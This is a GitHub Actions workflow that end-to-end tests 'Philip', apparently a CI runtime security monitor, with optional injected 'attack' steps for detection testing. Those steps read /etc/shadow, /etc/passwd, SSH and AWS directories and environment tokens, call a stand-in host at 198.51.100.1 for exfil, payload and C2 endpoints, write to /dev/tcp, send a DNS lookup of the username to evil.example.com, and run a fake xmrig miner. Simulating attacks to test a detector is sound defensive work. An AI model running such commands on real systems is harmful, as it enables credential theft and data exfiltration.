name: Philip E2E Test

on:
  workflow_dispatch:
    inputs:
      job:
        description: "Job type to run"
        required: true
        type: choice
        options:
          - baseline
          - docker
          - python
          - go
          - deploy
        default: baseline
      iteration:
        description: "Iteration number"
        required: false
        default: "1"
      attack:
        description: "Inject simulated attack commands"
        required: false
        type: boolean
        default: false

jobs:
  e2e:
    name: "E2E (${{ inputs.job }}${{ inputs.attack == 'true' && ' + attack' || '' }} #${{ inputs.iteration }})"
    runs-on: [self-hosted, philip]
    env:
      WORKDIR: /tmp/philip-e2e-${{ github.run_id }}
      GOCACHE: /tmp/philip-gocache-${{ github.run_id }}
    steps:
      - uses: actions/checkout@v4

      - name: Philip monitor start
        uses: ./action
        with:
          mode: monitor

      # =========================================================
      # BASELINE job
      # =========================================================
      - name: "Install dependencies"
        if: inputs.job == 'baseline'
        run: |
          curl -sf https://registry.npmjs.org/express > /dev/null 2>&1 || true
          curl -sf https://pypi.org/simple/requests/ > /dev/null 2>&1 || true
          wget -q -O /dev/null https://registry.npmjs.org/lodash 2>/dev/null || true
          git --version
          python3 --version 2>/dev/null || true

      - name: "Build"
        if: inputs.job == 'baseline'
        run: |
          go vet ./... 2>/dev/null || true
          go build -o "${WORKDIR}/philip-server" ./backend/cmd/philip-server 2>/dev/null || true
          ls -la
          find . -name "*.go" -type f | head -20 | xargs wc -l 2>/dev/null || true

      - name: "Run tests"
        if: inputs.job == 'baseline'
        run: |
          go test ./backend/detection/... -count=1 -short 2>/dev/null || true
          go test ./backend/baseline/... -count=1 -short 2>/dev/null || true

      - name: "Lint"
        if: inputs.job == 'baseline'
        run: |
          gofmt -l ./backend/ 2>/dev/null || true
          go vet ./backend/... 2>/dev/null || true

      - name: "Attack: baseline"
        if: inputs.job == 'baseline' && inputs.attack == 'true'
        run: |
          echo "=== INJECTED ATTACK in baseline job ==="
          cat /proc/self/environ > /dev/null 2>&1 || true
          timeout 2 curl -sf http://198.51.100.1:8888/exfil 2>/dev/null || true
          env | grep -i token > /dev/null 2>&1 || true

      # =========================================================
      # DOCKER job
      # =========================================================
      - name: "Docker: create project"
        if: inputs.job == 'docker'
        run: |
          mkdir -p "${WORKDIR}"
          cat > "${WORKDIR}/app.js" << 'EOF'
          const http = require('http');
          const server = http.createServer((req, res) => {
            res.writeHead(200);
            res.end('Hello from Philip test app\n');
          });
          server.listen(3000);
          EOF
          cat > "${WORKDIR}/package.json" << 'EOF'
          {"name":"philip-test-app","version":"1.0.0","main":"app.js","scripts":{"start":"node app.js"}}
          EOF
          cat > "${WORKDIR}/Dockerfile" << 'EOF'
          FROM node:20-alpine
          WORKDIR /app
          COPY package.json ./
          RUN npm install --production 2>/dev/null || true
          COPY app.js ./
          EXPOSE 3000
          CMD ["node", "app.js"]
          EOF

      - name: "Docker: build and inspect"
        if: inputs.job == 'docker'
        run: |
          TAG="philip-test:${{ github.run_id }}"
          docker build -t "${TAG}" "${WORKDIR}"
          docker tag "${TAG}" "philip-test:latest"
          docker inspect "${TAG}" | head -40
          docker images | grep philip-test
          docker history "${TAG}" --no-trunc | head -20
          echo "fake-password" | docker login --username fake-user --password-stdin 2>/dev/null || echo "(login failed as expected)"

      - name: "Attack: docker"
        if: inputs.job == 'docker' && inputs.attack == 'true'
        run: |
          echo "=== INJECTED ATTACK in docker job ==="
          cat /etc/passwd > /dev/null 2>&1 || true
          timeout 2 nc -z 198.51.100.1 4444 2>/dev/null || true
          touch /tmp/xmrig && chmod +x /tmp/xmrig && timeout 2 /tmp/xmrig 2>/dev/null || true
          rm -f /tmp/xmrig

      - name: "Docker: cleanup images"
        if: inputs.job == 'docker' && always()
        run: |
          docker rmi "philip-test:${{ github.run_id }}" "philip-test:latest" 2>/dev/null || true

      # =========================================================
      # PYTHON job
      # =========================================================
      - name: "Python: create project"
        if: inputs.job == 'python'
        run: |
          mkdir -p "${WORKDIR}/tests"
          cat > "${WORKDIR}/requirements.txt" << 'EOF'
          requests>=2.28.0
          flask>=2.3.0
          pytest>=7.0.0
          flake8>=6.0.0
          EOF
          cat > "${WORKDIR}/app.py" << 'EOF'
          def add(a, b):
              return a + b

          def greet(name):
              return f"Hello, {name}!"

          def is_even(n):
              return n % 2 == 0
          EOF
          cat > "${WORKDIR}/tests/test_app.py" << 'EOF'
          import sys, os
          sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
          from app import add, greet, is_even

          def test_add():
              assert add(2, 3) == 5
              assert add(-1, 1) == 0

          def test_greet():
              assert greet("World") == "Hello, World!"

          def test_is_even():
              assert is_even(4) is True
              assert is_even(3) is False
          EOF
          cat > "${WORKDIR}/setup.py" << 'EOF'
          from setuptools import setup
          setup(name="philip-test-app", version="0.1.0", py_modules=["app"])
          EOF

      - name: "Python: install and test"
        if: inputs.job == 'python'
        run: |
          cd "${WORKDIR}"
          pip install -r requirements.txt 2>&1 | tail -5
          python -m pytest tests/ -v 2>&1 || true
          python -m flake8 app.py --max-line-length=120 2>&1 || true
          python setup.py sdist 2>&1 | tail -5 || true
          ls -la dist/ 2>/dev/null || true

      - name: "Attack: python"
        if: inputs.job == 'python' && inputs.attack == 'true'
        run: |
          echo "=== INJECTED ATTACK in python job ==="
          ls -la /home/*/.ssh/ 2>/dev/null || true
          timeout 2 curl -sf http://198.51.100.1:4444/payload -o /tmp/payload 2>/dev/null || true
          timeout 2 bash -c 'echo test > /dev/tcp/198.51.100.1/4444' 2>/dev/null || true

      # =========================================================
      # GO job
      # =========================================================
      - name: "Go: create project"
        if: inputs.job == 'go'
        run: |
          mkdir -p "${WORKDIR}"
          cat > "${WORKDIR}/go.mod" << 'EOF'
          module github.com/philip-test/sample

          go 1.21
          EOF
          cat > "${WORKDIR}/main.go" << 'EOF'
          package main

          import (
              "fmt"
              "net/http"
              "os"
          )

          func handler(w http.ResponseWriter, r *http.Request) {
              fmt.Fprintf(w, "Hello from Philip test service")
          }

          func add(a, b int) int { return a + b }

          func main() {
              port := os.Getenv("PORT")
              if port == "" { port = "8080" }
              http.HandleFunc("/", handler)
              fmt.Printf("Listening on :%s\n", port)
              http.ListenAndServe(":"+port, nil)
          }
          EOF
          cat > "${WORKDIR}/main_test.go" << 'EOF'
          package main

          import "testing"

          func TestAdd(t *testing.T) {
              if add(2, 3) != 5 { t.Error("Expected 5") }
              if add(-1, 1) != 0 { t.Error("Expected 0") }
          }
          EOF

      - name: "Go: build and test"
        if: inputs.job == 'go'
        env:
          GOPATH: /tmp/philip-gopath-${{ github.run_id }}
        run: |
          cd "${WORKDIR}"
          go mod download 2>&1 || true
          go vet ./... 2>&1
          go build -o "${WORKDIR}/sample-app" . 2>&1
          ls -la "${WORKDIR}/sample-app"
          go test -v -count=1 ./... 2>&1

      - name: "Attack: go"
        if: inputs.job == 'go' && inputs.attack == 'true'
        run: |
          echo "=== INJECTED ATTACK in go job ==="
          timeout 2 nslookup "$(whoami).evil.example.com" 2>/dev/null || true
          cat /proc/self/environ > /dev/null 2>&1 || true
          timeout 2 curl -sf http://198.51.100.1:9999/c2 2>/dev/null || true

      # =========================================================
      # DEPLOY job
      # =========================================================
      - name: "Deploy: check tooling"
        if: inputs.job == 'deploy'
        run: |
          aws --version 2>/dev/null || echo "(aws cli not installed)"
          kubectl version --client 2>/dev/null || echo "(kubectl not installed)"
          terraform --version 2>/dev/null || echo "(terraform not installed)"
          helm version 2>/dev/null || echo "(helm not installed)"
          docker --version 2>/dev/null || echo "(docker not installed)"
          jq --version 2>/dev/null || echo "(jq not installed)"

      - name: "Deploy: download artifacts"
        if: inputs.job == 'deploy'
        run: |
          mkdir -p "${WORKDIR}/artifacts"
          curl -sf -o "${WORKDIR}/artifacts/checksums.txt" https://raw.githubusercontent.com/actions/runner/main/LICENSE 2>/dev/null || echo "placeholder" > "${WORKDIR}/artifacts/checksums.txt"
          sha256sum "${WORKDIR}/artifacts/checksums.txt" || true
          echo "artifact-v1.2.3.tar.gz" > "${WORKDIR}/artifacts/manifest.txt"
          cat "${WORKDIR}/artifacts/manifest.txt"

      - name: "Deploy: cloud operations"
        if: inputs.job == 'deploy'
        run: |
          aws sts get-caller-identity 2>/dev/null || echo "(no AWS credentials)"
          aws s3 ls 2>/dev/null || echo "(no AWS credentials)"
          kubectl get nodes 2>/dev/null || echo "(no cluster)"
          kubectl get pods 2>/dev/null || echo "(no cluster)"
          terraform init -backend=false 2>/dev/null || echo "(no terraform config)"

      - name: "Deploy: health checks"
        if: inputs.job == 'deploy'
        run: |
          timeout 5 curl -sf http://localhost:8080/healthz 2>/dev/null || echo "(health endpoint not available)"
          timeout 5 curl -sf -o /dev/null -w "HTTP %{http_code}" http://localhost:8080/api/v1/baselines 2>/dev/null || echo "(API check)"
          nslookup github.com 2>/dev/null | head -5 || true
          dig github.com A +short 2>/dev/null || true
          timeout 5 curl -sf -o /dev/null -w "%{http_code}" https://github.com 2>/dev/null && echo " github.com reachable" || true

      - name: "Attack: deploy"
        if: inputs.job == 'deploy' && inputs.attack == 'true'
        run: |
          echo "=== INJECTED ATTACK in deploy job ==="
          cat /etc/shadow 2>/dev/null || true
          ls -la /home/*/.aws/ 2>/dev/null || true
          timeout 2 nc -z 198.51.100.1 4444 2>/dev/null || true
          timeout 2 curl -sf http://198.51.100.1:8888/exfil 2>/dev/null || true

      # =========================================================
      # Common: report + cleanup
      # =========================================================
      - name: "Philip results"
        if: always()
        uses: ./.github/actions/philip-report
        with:
          scenario: "${{ inputs.job }}${{ inputs.attack == 'true' && '-attack' || '' }}"
          iteration: ${{ inputs.iteration }}

      - name: "Cleanup"
        if: always()
        run: |
          rm -rf "${WORKDIR}"
          rm -rf /tmp/philip-gocache-${{ github.run_id }}
          rm -rf /tmp/philip-gopath-${{ github.run_id }}
          docker rmi "philip-test:${{ github.run_id }}" "philip-test:latest" 2>/dev/null || true
